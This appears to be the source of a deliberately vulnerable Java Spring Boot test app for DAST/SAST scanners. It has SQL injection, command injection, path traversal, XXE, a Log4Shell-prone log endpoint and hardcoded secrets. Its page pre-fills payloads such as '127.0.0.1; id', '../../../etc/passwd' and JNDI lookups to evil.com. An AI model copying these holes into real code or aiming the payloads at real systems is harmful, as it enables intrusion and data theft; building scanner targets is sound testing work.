package com.example;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.*;
import org.springframework.stereotype.Controller;
import org.springframework.http.MediaType;

import java.sql.*;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class SecurityApp {
    public static void main(String[] args) {
        SpringApplication.run(SecurityApp.class, args);
        System.out.println("=== Security Test App запущен на http://localhost:8080 ===");
    }
}

@RestController
class VulnerableController {
    
    private Connection getConnection() throws SQLException {
        return DriverManager.getConnection("jdbc:sqlite:test.db");
    }
    
    private static final String API_KEY = "sk_live_4eC39HqLyjWDarjtT1zdp7dc";
    private static final String PASSWORD = "SuperSecret123!";
    
    @GetMapping("/user")
    public String getUser(@RequestParam String id) {
        try (Connection conn = getConnection()) {
            String query = "SELECT username FROM users WHERE id = " + id;
            Statement stmt = conn.createStatement();
            ResultSet rs = stmt.executeQuery(query);
            
            if (rs.next()) {
                return "User: " + rs.getString("username");
            }
            return "User not found";
        } catch (SQLException e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @GetMapping("/ping")
    public String ping(@RequestParam String ip) {
        try {
            Process process = Runtime.getRuntime().exec("ping -c 1 " + ip);
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            return output.toString();
        } catch (IOException e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @GetMapping("/readfile")
    public String readFile(@RequestParam String filename) {
        try {
            String path = "/tmp/" + filename;
            BufferedReader reader = new BufferedReader(new FileReader(path));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            return content.toString();
        } catch (IOException e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @PostMapping(value = "/parsexml", consumes = MediaType.TEXT_PLAIN_VALUE)
    public String parseXml(@RequestBody String xml) {
        try {
            javax.xml.parsers.DocumentBuilderFactory factory = 
                javax.xml.parsers.DocumentBuilderFactory.newInstance();
            javax.xml.parsers.DocumentBuilder builder = factory.newDocumentBuilder();
            org.w3c.dom.Document doc = builder.parse(
                new java.io.ByteArrayInputStream(xml.getBytes()));
            return "XML parsed successfully";
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
    
    @GetMapping("/admin")
    public String adminPanel(@RequestParam(required = false) String token) {
        if ("admin-token-123".equals(token)) {
            return "Admin Panel: Sensitive Data";
        }
        return "Access Denied";
    }
    
    @GetMapping("/log")
    public String logMessage(@RequestParam String message) {
        org.apache.logging.log4j.Logger logger = 
            org.apache.logging.log4j.LogManager.getLogger(VulnerableController.class);
        logger.error("User message: " + message);
        return "Logged: " + message;
    }
    
    @GetMapping("/init")
    public String initDb() {
        try (Connection conn = getConnection()) {
            Statement stmt = conn.createStatement();
            stmt.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)");
            stmt.execute("INSERT OR IGNORE INTO users VALUES (1, 'admin', 'admin123')");
            stmt.execute("INSERT OR IGNORE INTO users VALUES (2, 'user', 'password456')");
            return "Database initialized";
        } catch (SQLException e) {
            return "Error: " + e.getMessage();
        }
    }
}

@Controller
class WebController {
    
    @GetMapping("/")
    public String index() {
        return "<!DOCTYPE html>\n" +
            "<html>\n" +
            "<head>\n" +
            "    <title>Security Test App - Java</title>\n" +
            "    <style>\n" +
            "        body { font-family: monospace; margin: 40px; background: #1e1e1e; color: #d4d4d4; }\n" +
            "        h1 { color: #ff6b6b; }\n" +
            "        .vuln { background: #2d2d2d; padding: 15px; margin: 15px 0; border-left: 4px solid #ff6b6b; }\n" +
            "        input, button { padding: 8px; margin: 5px; font-family: monospace; }\n" +
            "        input { background: #3c3c3c; border: 1px solid #555; color: #d4d4d4; width: 300px; }\n" +
            "        button { background: #0e639c; color: white; border: none; cursor: pointer; }\n" +
            "        button:hover { background: #1177bb; }\n" +
            "        pre { background: #252526; padding: 10px; overflow-x: auto; border-radius: 5px; }\n" +
            "        .endpoint { color: #4ec9b0; font-size: 12px; margin-top: 5px; }\n" +
            "        h2 { color: #ff6b6b; font-size: 18px; margin-top: 0; }\n" +
            "    </style>\n" +
            "</head>\n" +
            "<body>\n" +
            "    <h1>Java Security Testing Application</h1>\n" +
            "    <p>Приложение с намеренными уязвимостями для DAST/SAST тестирования</p>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>1. SQL Injection</h2>\n" +
            "        <div class=\"endpoint\">GET /user?id=1 OR 1=1</div>\n" +
            "        <form onsubmit=\"event.preventDefault(); test('/user?id='+encodeURIComponent(document.getElementById('sql').value))\">\n" +
            "            <input id=\"sql\" placeholder=\"1 OR 1=1\" value=\"1 OR 1=1\">\n" +
            "            <button type=\"submit\">Test SQL Injection</button>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>2. Command Injection</h2>\n" +
            "        <div class=\"endpoint\">GET /ping?ip=127.0.0.1; ls -la</div>\n" +
            "        <form onsubmit=\"event.preventDefault(); test('/ping?ip='+encodeURIComponent(document.getElementById('cmd').value))\">\n" +
            "            <input id=\"cmd\" placeholder=\"127.0.0.1; id\" value=\"127.0.0.1; id\">\n" +
            "            <button type=\"submit\">Test Command Injection</button>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>3. Path Traversal</h2>\n" +
            "        <div class=\"endpoint\">GET /readfile?filename=../../../etc/passwd</div>\n" +
            "        <form onsubmit=\"event.preventDefault(); test('/readfile?filename='+encodeURIComponent(document.getElementById('path').value))\">\n" +
            "            <input id=\"path\" placeholder=\"../../../etc/passwd\" value=\"../../../etc/passwd\">\n" +
            "            <button type=\"submit\">Test Path Traversal</button>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>4. Admin Bypass</h2>\n" +
            "        <div class=\"endpoint\">GET /admin?token=admin-token-123</div>\n" +
            "        <form onsubmit=\"event.preventDefault(); test('/admin?token='+encodeURIComponent(document.getElementById('token').value))\">\n" +
            "            <input id=\"token\" placeholder=\"admin-token-123\" value=\"admin-token-123\">\n" +
            "            <button type=\"submit\">Test Admin Access</button>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>5. Log4Shell (JNDI Injection)</h2>\n" +
            "        <div class=\"endpoint\">GET /log?message=${jndi:ldap://evil.com/a}</div>\n" +
            "        <form onsubmit=\"event.preventDefault(); test('/log?message='+encodeURIComponent(document.getElementById('log').value))\">\n" +
            "            <input id=\"log\" placeholder=\"${jndi:ldap://attacker.com/exploit}\" value=\"${jndi:ldap://localhost:1389/exploit}\">\n" +
            "            <button type=\"submit\">Test Log4Shell</button>\n" +
            "        </form>\n" +
            "    </div>\n" +
            "    \n" +
            "    <div class=\"vuln\">\n" +
            "        <h2>Initialize Database</h2>\n" +
            "        <button onclick=\"test('/init')\">Init Database</button>\n" +
            "    </div>\n" +
            "    \n" +
            "    <h3>Response:</h3>\n" +
            "    <pre id=\"response\">Click any button to test...</pre>\n" +
            "    \n" +
            "    <script>\n" +
            "        async function test(url) {\n" +
            "            const responseDiv = document.getElementById('response');\n" +
            "            responseDiv.textContent = 'Loading...';\n" +
            "            try {\n" +
            "                const response = await fetch(url);\n" +
            "                const text = await response.text();\n" +
            "                responseDiv.textContent = 'GET ' + url + '\\n\\n' + text.substring(0, 2000);\n" +
            "            } catch(e) {\n" +
            "                responseDiv.textContent = 'Error: ' + e.message;\n" +
            "            }\n" +
            "        }\n" +
            "    </script>\n" +
            "</body>\n" +
            "</html>";
    }
}
